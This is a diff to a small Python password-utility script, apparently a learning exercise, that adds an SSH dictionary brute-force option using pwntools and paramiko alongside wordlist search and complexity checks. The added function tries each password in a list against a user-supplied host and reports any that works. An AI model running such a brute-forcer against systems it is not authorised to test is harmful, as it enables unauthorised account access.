@@ -1,6 +1,8 @@
 import sys
 import time
 import re 
+from pwn import *
+import paramiko
 
 def file_iteration(file):
 
@@ -10,20 +12,20 @@ def file_iteration(file):
 			print(password)
 			time.sleep(1)
 
-def string_search(string, file):
+def string_search(phrase, file):
 
 	with open(file, "r") as password_list:
 		for password in password_list:
 			password = password.strip("\n")
 
-			if(string.lower() == password):
+			if(phrase.lower() == password):
 
 				print("\nThe string you entered is in the provided password list!")
 				print("\n")
 				sys.exit(0)
 
 		print("\nThe string you entered is not in the provided pasword list!")
-		print("The program will no exit...")
+		print("The program will now exit...")
 		sys.exit(0)
 
 
@@ -47,15 +49,46 @@ def evaluate_password(password, length_req, caps_req, nums_req, syms_req):
     if length_met and caps_met and nums_met and syms_met:
 
         print("\nSUCCESS: Your password meets all the complexity requirements!\n")
-
+        print("The program will now exit...")
+        
     else:
 
         print("\nFAILURE: Your password does not meet all the complexity requirements.\n")
+        print("The program will now exit...")
 
+
+def ssh_brute_force(host, username, passwords):
+      
+    attempts = 0
+
+    with open(passwords, "r") as password_list:
+        for password in password_list:
+            password = password.strip("\n")
+
+            try:
+                print("[{}] Attempting password: '{}'!".format(attempts, password))
+
+                response = ssh(host=host, user=username, password=password, timeout=1)
+
+                if response.connected():
+                    print("[>] Valid password found: '{}'!".format(password))
+                    print("The program will now exit...")
+
+                    response.close()
+                    break
+
+                response.close()
+
+            except paramiko.ssh_exception.AuthenticationException:
+                print("[X] Invalid password!")
+
+            attempts += 1
+     
 
 mode = input("""To iterate through list enter 1.
 To input a string and compare with list enter 2.
 To evaluate a password for complexity enter 3.
+To authenticate to an SSH server, enter 4.             
 Choose your option: """)
 
 if mode == "1":
@@ -66,10 +99,10 @@ if mode == "1":
     
 elif mode == "2":
     
-    string = input("Please provide the string used for the search: ")
+    phrase = input("Please provide the string used for the search: ")
     file = input("Please enter the password list name (ex. password.txt): ")
     
-    string_search(string, file)
+    string_search(phrase, file)
 
 elif mode == "3":
     
@@ -80,9 +113,18 @@ elif mode == "3":
     syms_req = int(input("Required minimum number of symbols: "))
     
     evaluate_password(password, length_req, caps_req, nums_req, syms_req)
-    
+
+elif mode == "4":
+      
+    host = input("Please provide the host IP: ")
+    username = input("Please provide the username: ")
+    passwords = input("Please provide the password list file: ")
+
+    ssh_brute_force(host, username, passwords)
+
 else:
     
     print("Wrong input! Exiting program..")
     sys.exit(1)
+
 
